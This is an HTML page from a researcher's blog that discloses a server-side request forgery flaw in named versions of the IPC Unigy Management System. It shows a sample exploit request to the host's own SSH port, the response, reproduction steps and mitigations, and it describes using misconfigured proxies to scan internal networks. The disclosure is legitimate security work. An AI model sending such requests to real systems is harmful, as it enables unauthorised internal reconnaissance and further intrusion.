@@ -1,0 +1,222 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="theme-color" content="#0a0e0a">
+
+  
+  <title>Vulnerability Report - SSRF :: 0xbr484</title>
+
+  <link rel="icon" href="/assets/images/icon.ico">
+  <link rel="stylesheet" href="/assets/css/style.css">
+
+  <!-- Begin Jekyll SEO tag v2.9.0 -->
+<title>Vulnerability Report - SSRF | 0xbr484</title>
+<meta name="generator" content="Jekyll v4.4.1" />
+<meta property="og:title" content="Vulnerability Report - SSRF" />
+<meta name="author" content="br484" />
+<meta property="og:locale" content="en" />
+<meta name="description" content="Vulnerability Report: SSRF in IPC Unigy™ Management System Vulnerability Description A Server-Side Request Forgery (SSRF) vulnerability has been identified in the IPC Unigy™ Management System, affecting the following versions: Unigy™ Version 04.03.00.08.0027 COP Version 03.00.01.00.0018 OS Patch Version 06.00.00.34.0008 This vulnerability allows a remote attacker to make arbitrary HTTP requests to internal and external resources, using the affected system as a proxy. This can be exploited to access internal data, scan the internal network, and potentially exploit other vulnerabilities that would otherwise be inaccessible externally. Technical Details Exploitation Request Below is an example of an HTTP request that exploits the…" />
+<meta name="twitter:description" property="og:description" content="Vulnerability Report: SSRF in IPC Unigy™ Management System Vulnerability Description A Server-Side Request Forgery (SSRF) vulnerability has been identified in the IPC Unigy™ Management System, affecting the following versions: Unigy™ Version 04.03.00.08.0027 COP Version 03.00.01.00.0018 OS Patch Version 06.00.00.34.0008 This vulnerability allows a remote attacker to make arbitrary HTTP requests to internal and external resources, using the affected system as a proxy. This can be exploited to access internal data, scan the internal network, and potentially exploit other vulnerabilities that would otherwise be inaccessible externally. Technical Details Exploitation Request Below is an example of an HTTP request that exploits the…" />
+<link rel="canonical" href="https://br484.github.io/posts/VR/" />
+<meta property="og:url" content="https://br484.github.io/posts/VR/" />
+<meta property="og:site_name" content="0xbr484" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2024-06-05T20:29:53-03:00" />
+<meta property="article:modified_time" content="2024-06-05T20:29:53-03:00" />
+<meta name="twitter:card" content="summary" />
+<meta name="twitter:title" content="Vulnerability Report - SSRF" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"br484"},"dateModified":"2024-06-05T20:29:53-03:00","datePublished":"2024-06-05T20:29:53-03:00","description":"Vulnerability Report: SSRF in IPC Unigy™ Management System Vulnerability Description A Server-Side Request Forgery (SSRF) vulnerability has been identified in the IPC Unigy™ Management System, affecting the following versions: Unigy™ Version 04.03.00.08.0027 COP Version 03.00.01.00.0018 OS Patch Version 06.00.00.34.0008 This vulnerability allows a remote attacker to make arbitrary HTTP requests to internal and external resources, using the affected system as a proxy. This can be exploited to access internal data, scan the internal network, and potentially exploit other vulnerabilities that would otherwise be inaccessible externally. Technical Details Exploitation Request Below is an example of an HTTP request that exploits the…","headline":"Vulnerability Report - SSRF","mainEntityOfPage":{"@type":"WebPage","@id":"https://br484.github.io/posts/VR/"},"url":"https://br484.github.io/posts/VR/"}</script>
+<!-- End Jekyll SEO tag -->
+
+</head>
+
+<body>
+  <div class="scanlines" aria-hidden="true"></div>
+  <div class="crt">
+
+    <header class="term-bar">
+  <div class="term-bar__chrome">
+    <span class="dot dot--red"></span>
+    <span class="dot dot--amber"></span>
+    <span class="dot dot--green"></span>
+  </div>
+  <a class="term-bar__title" href="/">
+    br484@localhost<span class="muted">:~$</span>
+  </a>
+  <nav class="term-nav" aria-label="Main navigation">
+    
+      
+      
+      <a class="term-nav__link " href="/">
+        <span class="term-nav__icon">~</span>home
+      </a>
+    
+      
+      
+      <a class="term-nav__link " href="/posts/">
+        <span class="term-nav__icon">$</span>posts
+      </a>
+    
+  </nav>
+</header>
+
+
+    <main class="content">
+      <article class="post">
+  <header class="post__header">
+    <div class="post__breadcrumb">
+      <span class="prompt">$</span> cat
+      <a href="/posts/">posts</a>/<span class="post__file">vulnerability-report-ssrf.md</span>
+    </div>
+    <h1 class="post__title">Vulnerability Report - SSRF</h1>
+    <div class="post__meta">
+      <time datetime="2024-06-05T20:29:53-03:00">2024-06-05</time>
+      
+        <span class="post__meta-sep">·</span>
+        <span class="post__cats">
+          <span class="cat">vulnerability</span>
+        </span>
+      
+      <span class="post__meta-sep">·</span>
+      <span class="post__readtime">3 min</span>
+    </div>
+    
+  </header>
+
+  <div class="post__body">
+    <h3 id="vulnerability-report-ssrf-in-ipc-unigy-management-system">Vulnerability Report: SSRF in IPC Unigy™ Management System</h3>
+
+<hr />
+
+<h4 id="vulnerability-description">Vulnerability Description</h4>
+
+<p>A Server-Side Request Forgery (SSRF) vulnerability has been identified in the IPC Unigy™ Management System, affecting the following versions:</p>
+
+<ul>
+  <li><strong>Unigy™ Version 04.03.00.08.0027</strong></li>
+  <li><strong>COP Version 03.00.01.00.0018</strong></li>
+  <li><strong>OS Patch Version 06.00.00.34.0008</strong></li>
+</ul>
+
+<p>This vulnerability allows a remote attacker to make arbitrary HTTP requests to internal and external resources, using the affected system as a proxy. This can be exploited to access internal data, scan the internal network, and potentially exploit other vulnerabilities that would otherwise be inaccessible externally.</p>
+
+<h4 id="technical-details">Technical Details</h4>
+
+<h5 id="exploitation-request">Exploitation Request</h5>
+
+<p>Below is an example of an HTTP request that exploits the SSRF vulnerability:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>GET http://127.0.0.1:22 HTTP/1.1
+Host: 127.0.0.1
+Sec-Ch-Ua: " Not A;Brand";v="99", "Chromium";v="90"
+Sec-Ch-Ua-Mobile: ?0
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+Sec-Fetch-Site: none
+Sec-Fetch-Mode: navigate
+Sec-Fetch-User: ?1
+Sec-Fetch-Dest: document
+Accept-Encoding: gzip, deflate
+Accept-Language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7
+Connection: close
+</code></pre></div></div>
+
+<h5 id="obtained-response">Obtained Response</h5>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>HTTP/1.1 200 OK
+Date: Fri, 31 May 2024 15:01:18 GMT
+Server: Apache
+X-Frame-Options: SAMEORIGIN
+Connection: close
+Content-Length: 19
+
+SSH-2.0-OpenSSH_8.1
+</code></pre></div></div>
+
+<h3 id="detailed-exploitation">Detailed Exploitation</h3>
+
+<h4 id="requests-to-internal-ports">Requests to Internal Ports</h4>
+
+<p>Exploitation can be conducted by sending requests to internal ports of the server itself:</p>
+
+<p><img src="assets/image.png" alt="Internal Port Exploitation" /></p>
+
+<h4 id="requests-to-external-sites">Requests to External Sites</h4>
+
+<p>Additionally, requests can be sent to external websites, allowing the exploitation of external services using the vulnerable server as a proxy:</p>
+
+<p><img src="assets/image-1.png" alt="External Site Exploitation" /></p>
+
+<h3 id="impact">Impact</h3>
+
+<p>Successful exploitation of this vulnerability could allow an attacker to:</p>
+
+<ul>
+  <li>Access protected internal resources.</li>
+  <li>Scan the internal network and discover other vulnerable systems.</li>
+  <li>Conduct further attacks based on the information obtained.</li>
+</ul>
+
+<h3 id="reproducing-the-vulnerability">Reproducing the Vulnerability</h3>
+
+<ol>
+  <li>Send the HTTP request above using a tool such as Burp Suite or Postman.</li>
+  <li>Observe the response that returns information about the internal service.</li>
+</ol>
+
+<h3 id="suggested-mitigations">Suggested Mitigations</h3>
+
+<p>To mitigate this vulnerability, it is recommended to:</p>
+
+<ul>
+  <li>Implement strict validation and sanitization of user inputs.</li>
+  <li>Restrict the destinations allowed for requests made by the server.</li>
+</ul>
+
+<h3 id="additional-references">Additional References</h3>
+
+<p>Exploiting misconfigured reverse proxies can allow attackers to access internal services through the proxy’s “localhost” interface and other internal hosts. This can be done if the proxy allows connections to the “localhost” interface or internal hosts, which can be used as a rudimentary private network scanner.</p>
+
+<h4 id="exploitation-examples">Exploitation Examples</h4>
+
+<ul>
+  <li><strong>Connecting to SSH/SMTP</strong>: A misconfigured HTTP proxy can be exploited to connect to non-HTTP ports, revealing sensitive information about target services.</li>
+  <li><strong>Finding Hosts</strong>: With the ability to connect to the private network through a proxy, host and port discovery can be conducted using tools like Burp Intruder to test various hostnames and ports.</li>
+</ul>
+
+<p>For more information on exploiting open and misconfigured proxies, see the full article <a href="https://blog.projectdiscovery.io/abusing-reverse-proxies-internal-access/">Abusing Reverse Proxies, Part 2: Internal Access</a>.</p>
+
+  </div>
+
+  <footer class="post__footer">
+    <a class="back-link" href="/posts/"><span class="prompt">$</span> cd ..</a>
+  </footer>
+</article>
+
+    </main>
+
+    <footer class="term-footer">
+  <span class="term-footer__prompt">br484@localhost<span class="muted">:~$</span></span>
+  <span class="term-footer__cmd">echo</span>
+  <span class="term-footer__out">"&copy; 2026 br484 — powered by energy drinks &amp; sleepless nights"</span>
+  <span class="term-footer__links">
+    <a class="social" href="https://github.com/br484" rel="me noopener" target="_blank" aria-label="GitHub">
+      <svg class="social__icon" viewBox="0 0 16 16" width="15" height="15" fill="currentColor" aria-hidden="true"><path d="M8 0C3.58 0 0 3.58 0 8c0 3.54 2.29 6.53 5.47 7.59.4.07.55-.17.55-.38 0-.19-.01-.82-.01-1.49-2.01.37-2.53-.49-2.69-.94-.09-.23-.48-.94-.82-1.13-.28-.15-.68-.52-.01-.53.63-.01 1.08.58 1.23.82.72 1.21 1.87.87 2.33.66.07-.52.28-.87.51-1.07-1.78-.2-3.64-.89-3.64-3.95 0-.87.31-1.59.82-2.15-.08-.2-.36-1.02.08-2.12 0 0 .67-.21 2.2.82a7.65 7.65 0 0 1 2-.27c.68 0 1.36.09 2 .27 1.53-1.04 2.2-.82 2.2-.82.44 1.1.16 1.92.08 2.12.51.56.82 1.27.82 2.15 0 3.07-1.87 3.75-3.65 3.95.29.25.54.73.54 1.48 0 1.07-.01 1.93-.01 2.2 0 .21.15.46.55.38A8.013 8.013 0 0 0 16 8c0-4.42-3.58-8-8-8z"/></svg>
+      <span>github</span>
+    </a>
+    <a class="social" href="https://t.me/br484" rel="me noopener" target="_blank" aria-label="Telegram">
+      <svg class="social__icon" viewBox="0 0 24 24" width="15" height="15" fill="currentColor" aria-hidden="true"><path d="M9.78 18.65l.28-4.23 7.68-6.92c.34-.31-.07-.46-.52-.19L7.74 13.3 3.64 12c-.88-.25-.89-.86.2-1.3l15.97-6.16c.73-.33 1.43.18 1.15 1.3l-2.72 12.81c-.19.91-.74 1.13-1.5.71l-4.07-3.01-1.96 1.9c-.21.21-.39.39-.78.39z"/></svg>
+      <span>telegram</span>
+    </a>
+  </span>
+  <span class="cursor" aria-hidden="true">&#9608;</span>
+</footer>
+
+
+  </div>
+</body>
+</html>
